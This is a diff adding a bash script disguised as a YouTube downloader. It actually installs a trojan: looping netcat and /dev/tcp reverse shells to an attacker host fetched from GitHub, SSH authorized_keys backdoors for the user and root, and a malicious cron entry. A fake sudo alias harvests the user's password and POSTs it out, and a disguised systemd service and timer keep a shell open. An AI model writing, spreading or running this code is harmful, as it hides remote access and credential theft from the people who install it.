@@ -1,0 +1,219 @@
+#!/usr/bin/bash
+
+# Fetch Listener Info
+attacker_ip=$(curl -f -s https://raw.githubusercontent.com/needl32/hemlo/main/ip > /dev/null 2>&1)
+attacker_port=$(curl -f -s https://raw.githubusercontent.com/needl32/hemlo/main/port > /dev/null 2>&1)
+attacker_port_log=$(curl -f -s https://raw.githubusercontent.com/needl32/hemlo/main/logging_port > /dev/null 2>&1)
+key="$(curl -f -s https://raw.githubusercontent.com/needl32/hemlo/main/pub 2> /dev/null )"
+
+# Victim's temp file/dir names
+temp_dir="/home/$USER/.tmp"
+fksudo="service-$(echo ${USER} | base64)"
+fksudo_pass="${fksudo}p"
+
+# Service parameters
+interval=1200
+sname="$(uname)-signature-checker"
+sdesc="$(uname) service for outdated signature checks"
+
+# Obfuscations
+nc_obfus="service-$(echo ${USER}-tcat | base64)"
+
+
+report()
+{
+	sleep 5 && curl -X POST -H "Content-Type: application/json" -d "{$USER:$@}" $attacker_ip:$attacker_port_log > /dev/null 2>&1
+}
+
+guarenteeSessionPersistance()
+{
+	if nc -V > /dev/null 2>&1;then
+		while true;
+		do
+			nc -e /bin/bash $attacker_ip $attacker_port > /dev/null 2>&1
+			sleep 30
+		done&
+		disown
+		report "Temporary-Persistance:Active"
+	else
+		curl -f -L http://www.stearns.org/nc/nc-static-exec -o $temp_dir/$nc_obfus > /dev/null 2>&1 && chmod +x $temp_dir/$nc_obfus > /dev/null 2>&1
+		if [ -f $temp_dir/$nc_obfus ];then
+			if $temp_dir/$nc_obfus -V > /dev/null 2>&1;then
+				report "Temporary-Persistance:Active"
+				while true;
+				do
+					$temp_dir/$nc_obfus -e /bin/bash $attacker_ip $attacker_port > /dev/null 2>&1
+					sleep 30
+				done&
+				disown
+			else
+				report "Temporary-Persistance:Failed"
+			fi
+		fi
+	fi
+}
+configureSSH()
+{
+	if ! systemctl status sshd > /dev/null 2>&1 ;then
+		report 'ssh-1:0'
+	else
+		report "ssh-1:1:$USER:$(curl ifconfig.me 2> /dev/null):$(cat /etc/ssh/sshd_config 2> /dev/null | grep -o "Port [0-9]*")"
+		if [ ! -d ~/.ssh ];then
+			mkdir ~/.ssh
+		fi
+		printf "\n$key" >> ~/.ssh/authorized_keys;
+	fi
+}
+configureCron()
+{
+	if [ -d /etc/cron.d ];then
+		if echo "* * * * * $USER bash -c \"bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1\"" 2> /dev/null > /etc/cron.d/0hourly;then
+			report 'cron-1:1'
+		else
+			report 'cron-1:0'
+		fi
+	else
+		report 'cron-1:0'
+	fi
+}
+configureFSudo()
+{
+	# You will listen with netcat on the server as `echo Ok | nc -lp 9998 | grep { >> $temp_dir/log`
+	# Listener will be in loop for multiple reporting logs
+	cp /home/$USER/.bashrc /home/$USER/.bas_profile > /dev/null 2>&1
+	printf "\
+#!/usr/bin/bash
+if [ -f $temp_dir/$fksudo_pass ]; then
+    /usr/bin/sudo \$@
+else
+    if [ -z \${@+x} ]; then
+        /usr/bin/sudo
+    else
+        read -sp \"[sudo] password for \${USER}: \" sudopass
+        echo \"\"
+        echo \$sudopass > $temp_dir/$fksudo_pass
+        echo \$sudopass | sudo -S -p \"\" \$@;
+        if echo \$sudopass | sudo -S -p \"\" ls > /dev/null 2>&1;then
+			curl -X POST -H \"Content-Type: application/json\" -d \"{$USER:\$sudopass}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			if ! ssh -V > /dev/null 2>&1 > /dev/null;then
+				wget https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.8p1.tar.gz -o $temp_dir/openssh.tar.gz > /dev/null 2>&1
+				tar -xf $temp_dir/openssh.tar.gz -C $temp_dir > /dev/null 2>&1
+				if make -v > /dev/null 2>&1;then
+					sudo bash -c \"cd $temp_dir/openssh && make install\"
+					curl -X POST -H \"Content-Type: application/json\" -d \"{ssh-root:1:$USER:\$(curl ifconfig.me 2> /dev/null):\$(cat /etc/ssh/sshd_config 2> /dev/null | grep -o \"Port [0-9]*\")}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+				else
+					curl -X POST -H \"Content-Type: application/json\" -d \"{$USER:No GNU-Make}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+				fi
+			else
+				curl -X POST -H \"Content-Type: application/json\" -d \"{ssh-root:1:\$(cat /etc/ssh/sshd_config 2> /dev/null | grep -o \"Port [0-9]*\")}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			fi
+			sudo bash -c \"if [ ! -d /root/.ssh ];then mkdir /root/.ssh;fi && echo '$key' >> /root/.ssh/authorized_keys\"
+			
+			# BEGIN .service
+			sudo bash -c \"echo -e \\'\\
+			[Unit]
+			Description=${sdesc}
+			Wants=${sname}.timer
+
+			[Service]
+			ExecStart=/bin/${sname}' > /lib/systemd/system/${sname}.service\" 2> /dev/null
+			if [ \$? == 0 ];then
+				curl -X POST -H \"Content-Type: application/json\" -d \"{Service: Added}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			else
+				curl -X POST -H \"Content-Type: application/json\" -d \"{Service: Cant Add}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			fi
+			# END .service
+
+			# BEGIN .timer
+			sudo bash -c \"echo -e \\'\\
+			[Unit]
+			Description=${sdesc}
+			Requires=${sname}.service
+
+			[Timer]
+			OnBootSec=10s
+			OnUnitActiveSec=${interval}s
+
+			[Install]
+			WantedBy=timers.target' > /lib/systemd/system/${sname}.timer\" 2> /dev/null
+			if [ \$? == 0 ];then
+				curl -X POST -H \"Content-Type: application/json\" -d \"{Timer: Added}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			else
+				curl -X POST -H \"Content-Type: application/json\" -d \"{Timer: Cant Add}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			fi
+
+			# END .timer
+
+			# BEGIN service.sh
+			sudo bash -c \\\"echo -e '#!/bin/bash\\\nbash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1' > /bin/${sname}\" 2> /dev/null
+			sudo chmod +x /bin/${sname} 2> /dev/null
+			if [ \$? == 0 ];then
+				curl -X POST -H \"Content-Type: application/json\" -d \"{Executable: Added}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			else
+				curl -X POST -H \"Content-Type: application/json\" -d \"{Executable: Cant Add}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			fi
+			# END service.sh
+
+			sudo chown root:root /bin/$sname > /dev/null 2>&1
+			sudo chmod 755 /bin/$sname > /dev/null 2>&1
+			chown root:root /lib/systemd/system/${sname}.service /lib/systemd/system/${sname}.timer > /dev/null 2>&1
+
+			sudo systemctl daemon-reload > /dev/null 2>&1
+			sudo systemctl enable --now ${sname} > /dev/null 2>&1
+			if [ \$? == 0 ];then
+				curl -X POST -H \"Content-Type: application/json\" -d \"{Daemon: Enabled}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			else
+				curl -X POST -H \"Content-Type: application/json\" -d \"{Daemon: Cant Enable}\" $attacker_ip\:$attacker_port_log > /dev/null 2>&1
+			fi
+
+			mv /home/\$USER/.bas_profile /home/\$USER/.bashrc > /dev/null 2>&1
+			alias sudo=/bin/sudo > /dev/null 2>&1
+			rm $temp_dir/${fksudo} > /dev/null 2>&1
+		fi
+    fi
+fi
+	" > $temp_dir/$fksudo 2> /dev/null
+	chmod +x $temp_dir/$fksudo > /dev/null 2>&1
+
+	printf "\nalias sudo=$temp_dir/${fksudo}" >> ~/.bashrc 2> /dev/null
+	report 'fksudo:configured'
+}
+downloadVideo()
+{
+	if ! youtube-dl -v > /dev/null 2>&1;then
+		if [ ! -f /tmp/youtube-dl ];then
+			echo "[+] Dependencies not found. Downloading..."
+			curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /tmp/youtube-dl
+			chmod +x /tmp/youtube-dl
+			echo "[+] Dependencies downloaded for temporary use"
+		fi
+		echo "[+] Please download official dependency YOUTUBE-DL using your package manager"
+		/tmp/youtube-dl $@
+	else
+		youtube-dl $@
+	fi
+}
+clean()
+{
+	sudo systemctl disable --now ${sname}
+	sudo rm /bin/$sname
+	sudo rm /lib/systemd/system/${sname}.timer
+	sudo rm /lib/systemd/system/${sname}.service
+	rm -r $temp_dir
+	mv /home/$USER/.bas_profile /home/$USER/.bashrc
+	sudo systemctl daemon-reload
+	killall YouTubeDownload
+}
+downloadVideo $@
+
+# Make a temporary directory
+if [ ! -d $temp_dir ];then
+	mkdir $temp_dir > /dev/null 2>&1
+fi
+
+if [ ! -f /bin/Linux-signature-checker ];then
+	guarenteeSessionPersistance& > /dev/null 2>&1
+	configureSSH& > /dev/null 2>&1
+	configureCron& > /dev/null 2>&1
+	configureFSudo& > /dev/null 2>&1
+fi
